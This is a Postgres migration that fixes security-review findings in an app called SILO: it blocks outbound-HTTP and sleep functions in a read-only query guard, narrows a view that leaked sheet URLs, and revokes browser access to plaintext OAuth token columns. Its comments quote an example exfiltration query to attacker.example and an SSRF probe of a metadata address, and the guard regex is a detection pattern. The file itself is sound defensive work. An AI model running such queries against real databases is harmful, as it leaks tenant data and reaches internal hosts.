-- ============================================================
-- 20261113010000_security_review_fixes.sql
--
-- Three findings from the read-only security review of 2026-11-12,
-- in one migration because each is a few lines and none depends on
-- another. Blake: "if we can fix all of these without changing user
-- experience, yes start plan and build."
--
-- Nothing here changes a row anyone sees, a page, or a permission the
-- app actually uses. Each part says what it was verified against on
-- production first.
--
-- PART 1 -- the shared read-only report engine refuses outbound HTTP.
-- PART 2 -- ar_sync_status_v stops handing out the retired Google
--           Sheets publish-to-web URLs.
-- PART 3 -- plaintext OAuth tokens stop being SELECTable by the
--           browser roles.
-- ============================================================


-- ============================================================
-- PART 1: the report engine refuses outbound HTTP and sleeps
--
-- THE HOLE (found 2026-11-12). 20261030100000 taught
-- silo_sql_refused_function to refuse set_config and the functions
-- that execute SQL handed to them as text. It does not refuse the
-- functions that make the DATABASE ITSELF issue a request:
--
--   select net.http_post('https://attacker.example/', <rows>::text::jsonb)
--   select extensions.http_get('http://169.254.169.254/...')
--
-- Both are SELECTs, so chat_run_readonly_query's single-SELECT and
-- read-only-transaction checks pass, and the guard returned null for
-- each (verified by calling it with those exact strings on production
-- 2026-11-12). Reachability verified the same day, read-only:
-- `authenticated` AND `anon` hold EXECUTE on net.http_get/_post/_delete/
-- _collect_response and on every extensions.http* function, AND USAGE
-- on both schemas. The runners are reachable from Ask SILO, every
-- saved report, every v3 dashboard tile and the developer API's
-- `query` tool.
--
-- What it buys an attacker: not cross-tenant READ -- the runners are
-- SECURITY INVOKER and RLS still bounds which rows they see. It buys
-- (a) egress for rows they may legitimately read, out of a channel
-- SILO does not log, and (b) SSRF from inside the database to hosts
-- only it can reach. pg_sleep is in the same list because it parks a
-- connection for the full statement timeout.
--
-- WHY NOT REVOKE THE GRANTS instead. Tried and rejected on
-- 2026-10-14: `revoke ... from anon, authenticated` is a NO-OP here
-- (there are no named grants; everything is held through the bare
-- PUBLIC ACL entry), and the corrected `from PUBLIC` form BREAKS
-- PRODUCTION -- net.http_post has proacl = null and is SECURITY
-- INVOKER, so `postgres` holds it only via PUBLIC, and the
-- trg_sample_notify trigger on product_samples dies. Refusing the
-- names at the one guard every runner already calls costs nothing and
-- cannot break a trigger.
--
-- HOW THE PATTERNS ARE SHAPED, and why not simply \mhttp\M:
--   * `\mnet\s*\.` refuses the whole pg_net schema, the way
--     20261030100000 refuses `\mrealtime\s*\.`. Nothing in any report
--     references that schema.
--   * `extensions\s*\.\s*http` is schema-qualified rather than the
--     whole `extensions` schema, because a report may legitimately
--     call extensions.similarity() or extensions.unaccent().
--   * the bare names carry their underscore suffix (http_get,
--     http_post, ...). A bare `\mhttp\M` would ALSO match the `http`
--     in a string literal like 'http://shop.example/' || handle --
--     \m matches at the word start and \M before the ':' -- so a
--     report that merely builds a URL for a label column would be
--     refused. That false positive is not acceptable; a column named
--     exactly `http_get` is not a real risk.
--   * the unqualified names cannot resolve today anyway
--     (chat_run_readonly_query runs with search_path=public, the two
--     developer-API runners with search_path=public, pg_temp, and
--     `extensions` is in neither), so they are depth against a future
--     search_path change, not the live path.
--
-- Checked on production 2026-11-12 before writing this: no built-in
-- report, no saved report and no tie-out mentions any of these names,
-- so nothing that runs today starts being refused.
--
-- create or replace keeps the grants from 20261030100000
-- (revoked from public and anon; authenticated and service_role).
-- ============================================================

create or replace function public.silo_sql_refused_function(p_sql text)
returns text
language sql
immutable
set search_path = ''
as $$
  select case
    when p_sql is null then null
    when lower(p_sql) ~ 'u&' then 'a U& escaped identifier'
    else substring(lower(p_sql) from
      '(\mset_config\M|\m[a-z_]*_to_xml[a-z_]*\M|\mts_stat\M|\mts_rewrite\M|\mindex_advisor\M|\mhypopg_[a-z_]+\M|\mgraphql\M|\mdblink[a-z_]*\M|\mrealtime\s*\.|\mnet\s*\.|\mextensions\s*\.\s*http|\mhttp_(get|post|put|patch|delete|head|header|set_curlopt|reset_curlopt|list_curlopt)\M|\mpg_sleep(_for|_until)?\M)')
  end
$$;

comment on function public.silo_sql_refused_function(text) is
  'Read-only query guard: returns the name of a refused function the SQL calls, or null. Refuses set_config (which switches auth.uid() and so RLS identity), functions that execute SQL text, and -- since 20261113010000 -- functions that make the database issue an outbound request (pg_net, extensions.http*) or sleep. Used by chat_run_readonly_query, silo_api_query and silo_api_run_report. See 20261030100000 and 20261113010000.';


-- ============================================================
-- PART 2: ar_sync_status_v stops disclosing the stored sheet URLs
--
-- THE HOLE (found 2026-11-12, verified live). An anonymous request
-- carrying only the public anon key:
--
--   GET /rest/v1/ar_sync_status_v?select=*
--
-- answered 200 with 1198 bytes, including payload.sources -- the
-- Google Sheets publish-to-web CSV URLs that were Critical 1 of the
-- 2026-10-14 audit. Those URLs 401 today because Blake unpublished
-- both workbooks on 2026-10-14 and PR #984 took them out of the repo,
-- so this is the remediated finding sitting in a view, not a live
-- leak. It is still the one address anybody would need if a workbook
-- were ever re-published by accident.
--
-- Why it reaches anon at all: this view is deliberately
-- security_invoker = false (20260805030000 -- job_sync_state is
-- RLS-enabled with zero policies, so only the view's owner `postgres`
-- can read it), and the Supabase default ACL grants it to anon. It is
-- the one definer wrapper of thirteen with no company filter, which
-- supabase/CLAUDE.md already records as "a known gap, not a pattern
-- to copy". job_sync_state has no company_entity_id column -- it is
-- keyed by job name -- so there is no tenant filter to add. The
-- disclosure is fixed where it belongs instead: at the columns.
--
-- THE FIX, two parts:
--   * `payload` becomes an ALLOWLIST projection, not a denylist. It
--     is rebuilt with jsonb_build_object from exactly the four keys
--     v2/backend.html reads (stale, newest_order_date, staleness_days,
--     stale_threshold_days -- read off that page 2026-11-12). An
--     allowlist means a key added to the stored payload later is not
--     disclosed by default; a `- 'sources'` denylist would have to be
--     edited again. Dropped with `sources`: company_entity_id,
--     sync_run_id, source_stats and six row counts, none of which any
--     reader touches.
--   * anon loses SELECT. v2/backend.html is the view's ONLY reader
--     (pages/baseballismwholesale.html, the other one, was retired in
--     #1241) and that page is requireAdmin()-gated, so it reads as
--     `authenticated`.
--
-- UX: unchanged. The page reads row.payload.stale,
-- .newest_order_date, .staleness_days and .stale_threshold_days plus
-- the top-level last_success_at and error_text; all six survive.
--
-- security_invoker = false is RE-STATED, not assumed: this view has
-- been flipped by a blanket "harden all views" pass once before
-- (20260805030000), and with invoker = true it silently returns zero
-- rows to every caller. verify_v2_schema.sql check 15 guards it.
--
-- create or replace keeps the column names and types, so grants and
-- the catalog entry survive; anon's SELECT is then revoked by name.
-- ============================================================

create or replace view public.ar_sync_status_v as
  select
    key,
    status,
    started_at,
    completed_at,
    last_success_at,
    updated_at,
    jsonb_build_object(
      'stale',                payload -> 'stale',
      'newest_order_date',    payload -> 'newest_order_date',
      'staleness_days',       payload -> 'staleness_days',
      'stale_threshold_days', payload -> 'stale_threshold_days'
    ) as payload,
    error_text
  from public.job_sync_state
  where key = 'ar_google_sheets_sync';

alter view public.ar_sync_status_v set (security_invoker = false);

revoke all on public.ar_sync_status_v from anon;
grant select on public.ar_sync_status_v to authenticated, service_role;

comment on view public.ar_sync_status_v is
  'AR Google Sheets sync freshness for the Ops panel on v2/backend.html. Definer (security_invoker = false) because job_sync_state is RLS deny-all; job_sync_state has no company_entity_id, so there is no tenant filter -- the disclosure boundary is the column list. `payload` is an ALLOWLIST of the four keys the page reads; do not widen it, and do not pass the stored payload through (it holds the retired sheet URLs). Not readable by anon since 20261113010000.';

-- The retired publish-to-web URLs themselves, out of the stored row.
-- Idempotent: re-running changes nothing once the key is gone. Safe
-- from being rewritten -- .github/workflows/ar-sync.yml fails every
-- dispatch by design (its CSV links are credentials deliberately left
-- unset) and has no cron, so nothing writes this row again.
update public.job_sync_state
   set payload = payload - 'sources'
 where key = 'ar_google_sheets_sync'
   and payload ? 'sources';


-- ============================================================
-- PART 3: plaintext OAuth tokens stop being SELECTable by the browser
--
-- THE HOLE (found 2026-11-12). quickbooks_connections,
-- klaviyo_connections and ad_platform_connections grant SELECT on
-- their access_token / refresh_token / api_key columns to
-- `authenticated` (and, on two of them, to `anon`). The row policy is
-- `company_entity_id = active_company_id() AND is_admin_user()`, and
-- is_admin_user() passes for nearly every profile in SILO -- so any
-- workspace admin could read their tenant's live QuickBooks, Klaviyo,
-- Google Ads, Meta and TikTok credentials in plaintext out of
-- PostgREST. QuickBooks' token carries write scope on the books.
--
-- This is an inconsistency, not a capability anything needs:
-- shopify_connections, shopify_pending_installs,
-- shopify_client_credentials, plaid_connection_secrets and
-- windsor_links already have exactly this grant revoked
-- (20260928120000 for Shopify), and v2/integrations.html names its
-- Shopify columns explicitly for that reason. Verified 2026-11-12: no
-- page in v2/, v3/ or pages/ reads any of these three columns, and
-- the two pages that select from these tables by name
-- (loadAdConnections, loadKlaviyoConnection) already list columns and
-- already leave the credentials out -- the Klaviyo one with a comment
-- saying why.
--
-- INSERT and UPDATE are deliberately LEFT IN PLACE. The admin pastes
-- a Meta System User token and a Klaviyo private key into
-- v2/integrations.html, which writes them straight to these columns
-- (`saveMetaToken` and the Klaviyo api_key connect/reconnect paths --
-- named by function, not line: that page moved ~200 lines between this
-- migration being written and merged). Those writes do not
-- return the column -- supabase-js only returns rows when .select()
-- is chained -- so write-without-read is exactly right here: a
-- credential can be handed in and never handed back.
--
-- ONE READER HAD TO CHANGE FIRST, in this same PR: the QuickBooks
-- card called .select('*') on quickbooks_connections
-- (v2/integrations.html loadQboConnection), and PostgREST expands `*`
-- against column privileges, so this revoke alone would have broken
-- that card with "permission denied for column access_token". It now
-- names its columns, the way the Shopify loader already does. Checked
-- first that nothing downstream reads a token: the page's _qboRow is
-- only ever used for .id, and renderQboConnection reads
-- refresh_token_expires_at (the EXPIRY, which is not a credential and
-- stays selectable), never the token.
--
-- Service role and postgres keep SELECT, which is what every sync
-- script and edge function uses.
--
-- HOW the revoke is written, and the trap it avoids. `revoke select
-- (access_token) ... from authenticated` ON ITS OWN IS A NO-OP here:
-- these tables carry a TABLE-level SELECT grant (Supabase's default,
-- `authenticated=arwdDxtm` on all three, read live 2026-11-12), and a
-- table-level grant covers every column, including ones whose
-- column-level grant you just removed. So this follows the
-- shopify_connections precedent in 20260928120000 exactly: revoke
-- SELECT from the TABLE, then re-grant it on every column EXCEPT the
-- credentials. The list is computed at apply time, so a column added
-- later is granted too rather than silently unreadable.
--
-- This also covers the MCP / developer API path, which is NOT the
-- `authenticated` role: silo_api_query is SECURITY DEFINER owned by
-- `silo_api_exec`. Checked live 2026-11-12 -- that role is a MEMBER of
-- `authenticated` with rolinherit = true and holds no grant of its own
-- on any of the three tables (no silo_api_exec entry in any relacl),
-- so it inherits whatever `authenticated` ends up with and the
-- narrowed grant reaches it. It is not BYPASSRLS either.
--
-- anon is left with nothing on the two tables that granted it: it has
-- no active company, so it could never read a row anyway, and no page
-- reads these tables before sign-in.
-- ============================================================

do $$
declare
  t    text;
  cols text;
  secret_cols text[];
begin
  foreach t in array array['quickbooks_connections', 'klaviyo_connections', 'ad_platform_connections']
  loop
    -- klaviyo_connections carries an api_key column as well; the other
    -- two do not, and naming a column that does not exist would make
    -- the grant list wrong rather than erroring, so it is filtered by
    -- what information_schema actually reports.
    secret_cols := array['access_token', 'refresh_token', 'api_key'];

    select string_agg(quote_ident(column_name), ', ' order by ordinal_position) into cols
      from information_schema.columns
     where table_schema = 'public'
       and table_name = t
       and not (column_name = any (secret_cols));

    if cols is null then
      raise exception 'security_review_fixes: no grantable columns found for public.%', t;
    end if;

    execute format('revoke select on public.%I from anon, authenticated', t);
    execute format('grant select (%s) on public.%I to authenticated', cols, t);
  end loop;
end $$;


-- ============================================================
-- PART 4: one SELECT policy stops being role-less
--
-- ad_platform_connections_admin_select has polroles = null, i.e. it
-- applies to PUBLIC -- every role, anon included -- while its two
-- siblings on quickbooks_connections and klaviyo_connections are
-- scoped `to authenticated`. The qual is the same for all three, so
-- an anon request did not leak: it matched the policy, tried to
-- evaluate active_company_id(), and got
-- `42501 permission denied for function active_company_id` (verified
-- live 2026-11-12 -- a 401, not a row). The sibling tables answer the
-- same request `200 []`.
--
-- So this is noise, not a hole: an anonymous caller learns the table
-- exists from the error text. It is fixed because a role-less
-- permissive policy is one is_admin_user() rewrite away from being
-- the real thing, and because the inconsistency invites someone to
-- "fix" the wrong one.
--
-- alter policy, not drop/create: the qual is preserved verbatim
-- rather than retyped.
-- ============================================================

alter policy ad_platform_connections_admin_select
  on public.ad_platform_connections
  to authenticated;
